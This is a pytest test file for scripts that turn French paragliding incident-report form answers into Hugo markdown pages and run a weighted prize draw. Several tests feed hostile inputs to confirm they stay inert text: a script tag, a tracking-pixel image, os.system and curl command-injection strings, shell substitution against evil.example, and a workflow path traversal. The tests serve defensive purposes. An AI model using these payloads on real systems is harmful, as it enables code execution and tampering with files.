"""Offline tests for scripts/sync.py and scripts/draw.py — no network, no Google deps."""

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import pytest

import sync
from draw import EMAIL_HEADERS, eligible_participants, ticket_value, tickets_for

LEGACY_EMAIL_HEADER = EMAIL_HEADERS[1]
OPTIONAL_EMAIL_HEADER = EMAIL_HEADERS[0]

# Fixture values mirror the real sheet's headers and answer style.
REAL_HUMAN_FACTORS = (
    "Biais cognitifs (Envie de rentabiliser le trajet, rando, excès de confiance...)"
)
REAL_AERO_FACTORS = (
    "Contradiction modèles / réalité (Le vent ou les nuages ne sont pas ceux prévus), "
    "Relevés directs (Balises qui forcissent, mauvaise orientation), "
    "Observation du trafic (Trop de sketchs au déco, ailes qui reculent ou se font secouer en l'air)"
)


def make_raw(**overrides):
    values = {
        "timestamp": "31/07/2026 13:29:39",
        "envie": "ma première transition chartreuse belledonne",
        "plan": "déco pravouta, aulp, st genis, chamrousse puis retour lumbin",
        "flight_date": "30/07/2026",
        "factors_human": REAL_HUMAN_FACTORS,
        "factors_social": "Bruit informationnel (Canal WhatsApp qui s'enflamme, fausses bonnes infos)",
        "factors_aero": REAL_AERO_FACTORS,
        "signals_detail": "la brise de pente était si forte qu'elle ne pouvait qu'être renforcée",
        "trigger": "le déco + vol du gars de pravouta",
        "hardest_factor": "L'investissement logistique et temps déjà consenti",
        "earlier_decision": "Non, la décision devait se prendre au déco.",
        "bilan": "je ne regrette pas d'être allé voir",
        "decision": "Décision collective",
        "sentiment": "Satisfait(e) d'avoir fait le bon choix",
        "stress": "1",
        "experience": "Débutant (en progression)",
        "confidence": "4",
    }
    values.update(overrides)
    return {sync.REX_COLUMNS[logical]: value for logical, value in values.items()}


class TestSplitCheckboxes:
    def test_commas_inside_parentheses_do_not_split(self):
        assert sync.split_checkboxes(REAL_HUMAN_FACTORS) == [REAL_HUMAN_FACTORS]

    def test_real_multi_select_cell(self):
        items = sync.split_checkboxes(REAL_AERO_FACTORS)
        assert len(items) == 3
        assert items[0] == (
            "Contradiction modèles / réalité (Le vent ou les nuages ne sont pas ceux prévus)"
        )
        assert items[2].startswith("Observation du trafic")

    def test_empty_cell(self):
        assert sync.split_checkboxes("") == []


class TestRexId:
    def test_deterministic_and_short(self):
        rex_id = sync.compute_rex_id("31/07/2026 13:29:39")
        assert rex_id == sync.compute_rex_id("31/07/2026 13:29:39")
        assert len(rex_id) == 10
        assert rex_id != sync.compute_rex_id("31/07/2026 13:29:40")


class TestParseRow:
    def test_blank_row_skipped(self):
        raw = {header: "" for header in sync.REX_COLUMNS.values()}
        assert sync.parse_row(raw) is None

    def test_timestamp_only_row_skipped(self):
        raw = {header: "" for header in sync.REX_COLUMNS.values()}
        raw["Horodateur"] = "31/07/2026 13:29:39"
        assert sync.parse_row(raw) is None

    def test_accents_preserved(self):
        entry = sync.parse_row(make_raw())
        assert entry.envie == "ma première transition chartreuse belledonne"
        assert entry.decision == "Décision collective"

    def test_multiline_bullet_field_collapsed(self):
        entry = sync.parse_row(make_raw(signals_detail="ligne un\nligne deux"))
        assert entry.signals_detail == "ligne un ligne deux"

    def test_multiline_block_field_kept(self):
        entry = sync.parse_row(make_raw(bilan="ligne un\r\nligne deux"))
        assert entry.bilan == "ligne un\nligne deux"


class TestDates:
    def test_summer_timestamp_gets_cest_offset(self):
        markdown = sync.render_markdown(sync.parse_row(make_raw()))
        assert "date: 2026-07-31T13:29:39+02:00\n" in markdown

    def test_winter_timestamp_gets_cet_offset(self):
        raw = make_raw(timestamp="15/01/2026 10:00:00")
        markdown = sync.render_markdown(sync.parse_row(raw))
        assert "date: 2026-01-15T10:00:00+01:00\n" in markdown

    def test_bad_timestamp_fails_loudly(self):
        raw = make_raw(timestamp="2026-07-31 13:29:39")
        with pytest.raises(ValueError):
            sync.render_markdown(sync.parse_row(raw))


class TestRenderMarkdown:
    def test_byte_exact_output(self):
        entry = sync.parse_row(make_raw())
        summary = json.dumps(sync.card_excerpt(entry), ensure_ascii=False)
        expected = f"""---
title: "#1 le déco + vol du gars de pravouta"
date: 2026-07-31T13:29:39+02:00
flightdate: "30/07/2026"
summary: {summary}
draft: false
---
**Expérience :** Débutant (en progression) | **Décision :** Décision collective

### Le Contexte
* **Pourquoi voler ?** ma première transition chartreuse belledonne
* **Plan :** déco pravouta, aulp, st genis, chamrousse puis retour lumbin
* **Vol prévu le :** 30/07/2026

### Signaux Faibles
* **Facteurs humains :** {REAL_HUMAN_FACTORS}
* **Facteurs sociaux :** Bruit informationnel (Canal WhatsApp qui s'enflamme, fausses bonnes infos)
* **Facteurs aérologiques & environnement :** {REAL_AERO_FACTORS}
* **Comment ils se sont manifestés :** la brise de pente était si forte qu'elle ne pouvait qu'être renforcée

### Le déclencheur
le déco + vol du gars de pravouta

### Bilan
je ne regrette pas d'être allé voir

### Analyse
* **Sentiment :** Satisfait(e) d'avoir fait le bon choix
* **Facteur le plus difficile à ignorer :** L'investissement logistique et temps déjà consenti
* **Décision possible plus tôt ?** Non, la décision devait se prendre au déco.
* **Stress :** 1/5 | **Confiance renforcée :** 4/5
"""
        assert sync.render_markdown(entry) == expected

    def test_render_is_deterministic(self):
        entry = sync.parse_row(make_raw())
        assert sync.render_markdown(entry) == sync.render_markdown(entry)

    def test_html_injection_stays_inert_text(self):
        raw = make_raw(bilan='<script>alert("x")</script>')
        markdown = sync.render_markdown(sync.parse_row(raw))
        # The script tag stays verbatim markdown text; goldmark (unsafe=false)
        # strips raw HTML at render time, so it never reaches the page as HTML.
        assert '<script>alert("x")</script>' in markdown

    def test_quotes_in_frontmatter_are_escaped(self):
        # Double quotes in user text are YAML-escaped in the title and summary.
        raw = make_raw(trigger='il a dit "non"')
        markdown = sync.render_markdown(sync.parse_row(raw))
        assert r'title: "#1 il a dit \"non\""' in markdown
        assert r'il a dit \"non\"' in markdown.split("summary:")[1].split("\n")[0]

    def test_long_excerpt_truncated_in_summary(self):
        raw = make_raw(bilan="x" * 600)
        markdown = sync.render_markdown(sync.parse_row(raw))
        assert "…" in markdown.split("summary:")[1].split("\n")[0]

    def test_no_footer_in_markdown(self):
        # The identifiant / report / license block is templated in
        # layouts/single.html, never baked into the generated content.
        markdown = sync.render_markdown(sync.parse_row(make_raw()))
        assert "Identifiant" not in markdown
        assert "Signaler" not in markdown
        assert "licence" not in markdown

    def test_empty_optional_fields_omit_bullets(self):
        raw = make_raw(envie="", factors_social="", stress="")
        markdown = sync.render_markdown(sync.parse_row(raw))
        assert "Pourquoi voler" not in markdown
        assert "Facteurs sociaux" not in markdown
        assert "Stress" not in markdown
        assert "**Confiance renforcée :** 4/5" in markdown

    def test_no_emojis_in_output(self):
        markdown = sync.render_markdown(sync.parse_row(make_raw()))
        assert all(ord(char) < 0x1F000 for char in markdown)


def make_raw_v2(**overrides):
    """A form-v2 row: v1 prose columns empty, v2 columns filled."""
    v2_values = {
        "narrative": (
            "Le plan a changé deux fois : triangle ambitieux, puis aller-retour, "
            "puis plouf.\nLa vague de pression arrivait plus tôt que prévu."
        ),
        "trigger_short": "Le vent est passé travers plein au déco",
        "lesson": "Décider avant de monter, pas sur le déco.",
    }
    v2_values.update({k: overrides.pop(k) for k in list(overrides) if k in v2_values})
    raw = make_raw(plan="", signals_detail="", trigger="", bilan="", **overrides)
    raw.update({sync.V2_COLUMNS[logical]: value for logical, value in v2_values.items()})
    return raw


class TestNumbering:
    def entries(self):
        # three submissions, deliberately out of sheet order by time
        return [
            sync.parse_row(make_raw(timestamp="03/08/2026 12:00:00")),  # 3rd chronologically
            sync.parse_row(make_raw(timestamp="01/08/2026 09:00:00")),  # 1st
            sync.parse_row(make_raw(timestamp="02/08/2026 15:30:00")),  # 2nd
        ]

    def test_numbers_follow_chronological_submission(self):
        nums = sync.assign_numbers(self.entries())
        assert nums[sync.compute_rex_id("01/08/2026 09:00:00")] == 1
        assert nums[sync.compute_rex_id("02/08/2026 15:30:00")] == 2
        assert nums[sync.compute_rex_id("03/08/2026 12:00:00")] == 3

    def test_removing_a_rex_does_not_renumber_others(self):
        entries = self.entries()
        full = sync.assign_numbers(entries)
        # drop the middle one (as if deleted); the others keep their numbers
        # only when numbering is computed over the SAME full set — which is
        # exactly what main() does (quarantined rows stay in `entries`).
        assert full[sync.compute_rex_id("03/08/2026 12:00:00")] == 3
        without_middle = [e for e in entries if e.timestamp_raw != "02/08/2026 15:30:00"]
        renumbered = sync.assign_numbers(without_middle)
        # This documents the one caveat: truly deleting an earlier row shifts
        # later numbers. Quarantine keeps the row, so this never happens in prod.
        assert renumbered[sync.compute_rex_id("03/08/2026 12:00:00")] == 2

    def test_new_submission_gets_next_number(self):
        entries = self.entries()
        before = sync.assign_numbers(entries)
        entries.append(sync.parse_row(make_raw(timestamp="04/08/2026 08:00:00")))
        after = sync.assign_numbers(entries)
        # existing numbers unchanged, newcomer is last
        for ts in ("01/08/2026 09:00:00", "02/08/2026 15:30:00", "03/08/2026 12:00:00"):
            assert before[sync.compute_rex_id(ts)] == after[sync.compute_rex_id(ts)]
        assert after[sync.compute_rex_id("04/08/2026 08:00:00")] == 4

    def test_number_appears_in_title(self):
        entry = sync.parse_row(make_raw())
        assert 'title: "#7 le déco + vol du gars de pravouta"' in sync.render_markdown(entry, 7)


class TestV2Format:
    def test_dispatch_on_narrative_presence(self):
        assert sync.parse_row(make_raw()).is_v2 is False
        assert sync.parse_row(make_raw_v2()).is_v2 is True

    def test_v1_rows_ignore_missing_v2_columns(self):
        # v1 fixture has no v2 headers at all — parse must not fail.
        entry = sync.parse_row(make_raw())
        assert entry.narrative == "" and entry.trigger_short == "" and entry.lesson == ""

    def test_byte_exact_v2_output(self):
        # User-typed values are markdown-escaped in the body (never in the
        # front matter, which is YAML-escaped and rendered as plain text).
        esc = sync.escape_markdown
        entry = sync.parse_row(make_raw_v2())
        summary = json.dumps(sync.card_excerpt(entry), ensure_ascii=False)
        expected = f"""---
title: "#1 Le vent est passé travers plein au déco"
date: 2026-07-31T13:29:39+02:00
flightdate: "30/07/2026"
summary: {summary}
draft: false
---
**Expérience :** {esc("Débutant (en progression)")} | **Décision :** Décision collective

### Pourquoi voler ?
ma première transition chartreuse belledonne

### Le récit
{esc("Le plan a changé deux fois : triangle ambitieux, puis aller-retour, puis plouf.")}
{esc("La vague de pression arrivait plus tôt que prévu.")}

### Le déclencheur
Le vent est passé travers plein au déco

### Qu'en retires-tu ?
{esc("Décider avant de monter, pas sur le déco.")}

### Signaux Faibles
* **Facteurs humains :** {esc(REAL_HUMAN_FACTORS)}
* **Facteurs sociaux :** {esc("Bruit informationnel (Canal WhatsApp qui s'enflamme, fausses bonnes infos)")}
* **Facteurs aérologiques & environnement :** {", ".join(esc(i) for i in sync.split_checkboxes(REAL_AERO_FACTORS))}

### Analyse
* **Sentiment :** {esc("Satisfait(e) d'avoir fait le bon choix")}
* **Facteur le plus difficile à ignorer :** {esc("L'investissement logistique et temps déjà consenti")}
* **Décision possible plus tôt ?** {esc("Non, la décision devait se prendre au déco.")}
* **Stress :** 1/5 | **Confiance renforcée :** 4/5
"""
        assert sync.render_markdown(entry) == expected

    def test_v2_title_uses_short_trigger(self):
        markdown = sync.render_markdown(sync.parse_row(make_raw_v2()))
        assert 'title: "#1 Le vent est passé travers plein au déco"' in markdown

    def test_v2_title_falls_back_when_no_trigger(self):
        raw = make_raw_v2(trigger_short="")
        markdown = sync.render_markdown(sync.parse_row(raw))
        assert 'title: "#1 Renoncement du 30/07/2026"' in markdown

    def test_v2_card_excerpt_is_the_narrative(self):
        markdown = sync.render_markdown(sync.parse_row(make_raw_v2()))
        summary_line = markdown.split("summary:")[1].split("\n")[0]
        assert "Le plan a changé deux fois" in summary_line

    def test_lesson_section_omitted_when_empty(self):
        markdown = sync.render_markdown(sync.parse_row(make_raw_v2(lesson="")))
        assert "Qu'en retires-tu ?" not in markdown

    def test_non_applicable_filtered_in_v2_signals(self):
        raw = make_raw_v2(factors_social="Non applicable")
        markdown = sync.render_markdown(sync.parse_row(raw))
        assert "Facteurs sociaux" not in markdown
        assert "Non applicable" not in markdown

    def test_narrative_newlines_preserved(self):
        entry = sync.parse_row(make_raw_v2())
        assert "\n" in entry.narrative

    def test_escape_markdown_neutralizes_syntax(self):
        assert sync.escape_markdown("**gras**") == r"\*\*gras\*\*"
        assert sync.escape_markdown("# titre") == r"\# titre"
        assert sync.escape_markdown("![pixel](http://evil/p.png)") == r"\!\[pixel\]\(http\://evil/p\.png\)"
        assert sync.escape_markdown("\\") == "\\\\"
        assert sync.escape_markdown("été à 2000 m, rien à signaler") == "été à 2000 m, rien à signaler"

    def test_tracking_pixel_markdown_is_inert_in_body(self):
        # In the rendered body, image markdown is escaped so no <img> is emitted.
        # (In the summary it stays raw, but PaperMod renders summaries via
        # `plainify`, which never interprets markdown — verified by a Hugo build.)
        raw = make_raw_v2(narrative="regarde ![pixel](https://evil.example/p.png) là")
        body = sync.render_markdown(sync.parse_row(raw)).split("### Le récit\n", 1)[1]
        assert "![pixel]" not in body
        assert r"\!\[pixel\]" in body

    def test_heading_and_emphasis_are_inert(self):
        raw = make_raw_v2(narrative="# faux titre\n**pas gras**")
        markdown = sync.render_markdown(sync.parse_row(raw))
        assert "\n# faux titre" not in markdown
        assert r"\# faux titre" in markdown
        assert r"\*\*pas gras\*\*" in markdown

    def test_summary_is_not_markdown_escaped(self):
        # The summary is plain text (YAML-escaped only, rendered via plainify),
        # never markdown: parentheses and apostrophes stay literal, no backslashes.
        raw = make_raw_v2(narrative="vent (fort) à l'atterro")
        markdown = sync.render_markdown(sync.parse_row(raw))
        assert 'summary: "vent (fort) à l\'atterro"' in markdown

    def test_hostile_payloads_stay_inert_data(self, tmp_path):
        # Classic injection payloads must round-trip as literal text: no
        # exception, file written under the hash name, content escaped.
        payloads = [
            "{0.__class__.__mro__}{settings.SECRET}",     # format-string attack
            "__import__('os').system('id')",              # eval-style payload
            "'; import os; os.system('curl evil') #",
            "$(curl https://evil.example) `id`",          # shell metacharacters
            "../../.github/workflows/evil.yml",           # path traversal attempt
            "ligne\x00nulle et \x1b[31mANSI\x1b[0m",      # control characters
        ]
        raw = make_raw_v2(narrative="\n".join(payloads))
        entry = sync.parse_row(raw)
        markdown = sync.render_markdown(entry)
        written, removed = sync.sync_content_dir(
            {sync.compute_rex_id(entry.timestamp_raw): markdown}, tmp_path
        )
        assert (written, removed) == (1, 0)
        files = list(tmp_path.glob("*.md"))
        assert len(files) == 1 and len(files[0].stem) == 10  # hash-named only
        content = files[0].read_text(encoding="utf-8")
        assert r"\_\_import\_\_" in content                  # escaped, not executable
        assert "curl" in content                             # present as plain text

    def test_mixed_rows_both_formats(self, tmp_path):
        rows = [make_raw(), make_raw_v2(timestamp="01/08/2026 09:00:00")]
        entries = [sync.parse_row(r) for r in rows]
        desired = {
            sync.compute_rex_id(e.timestamp_raw): sync.render_markdown(e) for e in entries
        }
        written, removed = sync.sync_content_dir(desired, tmp_path)
        assert (written, removed) == (2, 0)
        contents = [p.read_text(encoding="utf-8") for p in sorted(tmp_path.glob("*.md"))]
        assert sum("### Le récit" in c for c in contents) == 1
        assert sum("### Le Contexte" in c for c in contents) == 1


class TestSyncContentDir:
    def test_desired_state(self, tmp_path):
        (tmp_path / "_index.md").write_text("index", encoding="utf-8")
        (tmp_path / "stale00001.md").write_text("old", encoding="utf-8")
        desired = {"aaaaaaaaaa": "content a", "bbbbbbbbbb": "content b"}

        written, removed = sync.sync_content_dir(desired, tmp_path)

        assert (written, removed) == (2, 1)
        names = {path.name for path in tmp_path.glob("*.md")}
        assert names == {"_index.md", "aaaaaaaaaa.md", "bbbbbbbbbb.md"}
        assert (tmp_path / "_index.md").read_text(encoding="utf-8") == "index"

    def test_quarantined_id_removed(self, tmp_path):
        (tmp_path / "quarantine1.md").write_text("bad", encoding="utf-8")
        written, removed = sync.sync_content_dir({}, tmp_path)
        assert (written, removed) == (0, 1)
        assert list(tmp_path.glob("*.md")) == []

    def test_idempotent_second_run(self, tmp_path):
        desired = {"aaaaaaaaaa": "content a"}
        sync.sync_content_dir(desired, tmp_path)
        before = (tmp_path / "aaaaaaaaaa.md").stat().st_mtime_ns
        written, removed = sync.sync_content_dir(desired, tmp_path)
        assert (written, removed) == (0, 0)
        assert (tmp_path / "aaaaaaaaaa.md").stat().st_mtime_ns == before


class TestHeaderValidation:
    def test_missing_header_exits_listing_both(self, capsys):
        values = [["Horodateur", "Autre question"], ["x", "y"]]
        with pytest.raises(SystemExit):
            sync.rows_as_dicts(values, set(sync.REX_COLUMNS.values()), "test")
        err = capsys.readouterr().err
        assert "Header mismatch" in err
        assert "Quel était le plan de vol ?" in err

    def test_extra_columns_are_fine(self):
        headers = list(sync.REX_COLUMNS.values()) + ["Adresse e-mail", "Colonne photo"]
        values = [headers, [""] * len(headers)]
        rows = sync.rows_as_dicts(values, set(sync.REX_COLUMNS.values()), "test")
        assert len(rows) == 1

    def test_short_rows_padded(self):
        headers = list(sync.REX_COLUMNS.values())
        values = [headers, ["31/07/2026 13:29:39"]]
        rows = sync.rows_as_dicts(values, set(sync.REX_COLUMNS.values()), "test")
        assert rows[0]["Quel était le plan de vol ?"] == ""


class TestQuarantine:
    HEADERS = ["Horodateur", "rex_id", "pourquoi vous le signalez ?", "validé"]

    def test_lowercase_valide_header_accepted(self):
        values = [
            self.HEADERS,
            ["01/08/2026 10:00:00", "aaaaaaaaaa", "spam", "TRUE"],
            ["01/08/2026 10:01:00", "bbbbbbbbbb", "haine", ""],
        ]
        assert sync.quarantined_ids_from_values(values) == {"aaaaaaaaaa"}

    def test_vrai_and_checkbox_true_are_truthy(self):
        values = [
            ["rex_id", "Validé"],
            ["aaaaaaaaaa", "VRAI"],
            ["bbbbbbbbbb", "FALSE"],
            ["cccccccccc", "OUI"],
        ]
        assert sync.quarantined_ids_from_values(values) == {"aaaaaaaaaa", "cccccccccc"}

    def test_missing_valide_column_fails_loudly(self, capsys):
        values = [["rex_id"], ["aaaaaaaaaa"]]
        with pytest.raises(SystemExit):
            sync.quarantined_ids_from_values(values)
        assert "Validé" in capsys.readouterr().err

    def test_empty_tab_means_no_quarantine(self):
        assert sync.quarantined_ids_from_values([]) == set()
        assert sync.quarantined_ids_from_values([["rex_id", "Validé"]]) == set()


class TestTickets:
    def test_ticket_values_follow_geometric_tranches(self):
        assert [ticket_value(n) for n in range(1, 10)] == [
            1, 1, 1, 0.5, 0.5, 0.5, 0.25, 0.25, 0.25,
        ]

    def test_totals(self):
        assert tickets_for(1) == 1
        assert tickets_for(3) == 3
        assert tickets_for(6) == 4.5
        assert tickets_for(9) == 5.25

    def test_asymptotic_cap_of_six(self):
        # The series converges to 6; float rounding may land exactly on it.
        assert 5.99 < tickets_for(300) <= 6


class TestEligibleParticipants:
    def rows(self):
        return [
            {**make_raw(timestamp="01/06/2026 10:00:00"), LEGACY_EMAIL_HEADER: "alice@example.org"},
            {**make_raw(timestamp="02/06/2026 10:00:00"), LEGACY_EMAIL_HEADER: "Alice@Example.org"},
            {**make_raw(timestamp="03/06/2026 10:00:00"), LEGACY_EMAIL_HEADER: "bob@example.org"},
            {**make_raw(timestamp="04/06/2026 10:00:00"), LEGACY_EMAIL_HEADER: ""},
        ]

    def test_grouping_is_email_case_insensitive(self):
        participants = eligible_participants(self.rows(), set())
        assert participants["alice@example.org"].count == 2
        assert participants["bob@example.org"].count == 1

    def test_rows_without_email_are_skipped(self):
        participants = eligible_participants(self.rows(), set())
        assert len(participants) == 2

    def test_first_row_is_sheet_row_number(self):
        participants = eligible_participants(self.rows(), set())
        assert participants["alice@example.org"].first_row == 2
        assert participants["bob@example.org"].first_row == 4

    def test_quarantined_rex_do_not_count(self):
        quarantined = {sync.compute_rex_id("03/06/2026 10:00:00")}
        participants = eligible_participants(self.rows(), quarantined)
        assert "bob@example.org" not in participants

    def test_printable_fields_never_contain_the_email(self):
        participant = eligible_participants(self.rows(), set())["alice@example.org"]
        assert "alice" not in participant.email_hash
        assert len(participant.email_hash) == 8

    def test_optional_email_column_takes_priority_over_legacy(self):
        rows = [
            {
                **make_raw(timestamp="05/06/2026 10:00:00"),
                OPTIONAL_EMAIL_HEADER: "carol@example.org",
                LEGACY_EMAIL_HEADER: "stale@example.org",
            },
            {**make_raw(timestamp="06/06/2026 10:00:00"), OPTIONAL_EMAIL_HEADER: "dave@example.org"},
        ]
        participants = eligible_participants(rows, set())
        assert set(participants) == {"carol@example.org", "dave@example.org"}
